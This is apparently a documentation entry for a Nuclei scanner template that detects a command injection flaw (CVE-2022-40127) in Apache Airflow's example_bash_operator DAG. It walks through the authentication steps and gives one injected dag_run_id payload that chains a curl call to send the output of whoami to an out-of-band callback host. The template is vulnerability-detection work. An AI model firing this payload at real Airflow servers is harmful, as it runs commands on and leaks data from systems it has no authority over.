---
cve_id: CVE-2022-40127
template_path: nuclei-templates/http/cves/2022/CVE-2022-40127.yaml
affected_product: Apache Airflow
severity: high
authentication: required
external_callback: true
affected_versions: prior to 2.4.0
preconditions: [UI access and permission to trigger DAGs, example_bash_operator DAG available]
poc_classification: rce
---

## Vulnerability
A command injection vulnerability in the Example DAGs (specifically `example_bash_operator`) of Apache Airflow allows an attacker with UI access who can trigger DAGs to execute arbitrary commands via a malicious `run_id` / `dag_run_id` parameter when manually creating a DAG run. This issue affects Apache Airflow versions prior to 2.4.0.  
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). CWE-94.

## PoC / Detection
Classification: rce  
The template first issues a GET to `/login/` followed by a POST to `/login/` (with `username`, `password` and extracted CSRF token) to authenticate. It then sends a POST to `/api/v1/dags/example_bash_operator/dagRuns` containing the JSON payload `{"conf":{"dag_run":"{{randstr}}"},"dag_run_id":"id \"&& curl `whoami`.{{interactsh-url}}","logical_date":"..."}` to trigger command injection inside the bash operator. Detection succeeds on HTTP 200 status, `"state": "queued"` in the body, and an out-of-band DNS callback to the interactsh server.

## References
- https://github.com/Mr-xn/CVE-2022-40127
- https://nvd.nist.gov/vuln/detail/CVE-2022-40127
- http://www.openwall.com/lists/oss-security/2022/11/14/2
- https://github.com/apache/airflow/pull/25960
- https://lists.apache.org/thread/cf132hgm6jvzvsbpsozl3plf1r4cwysy
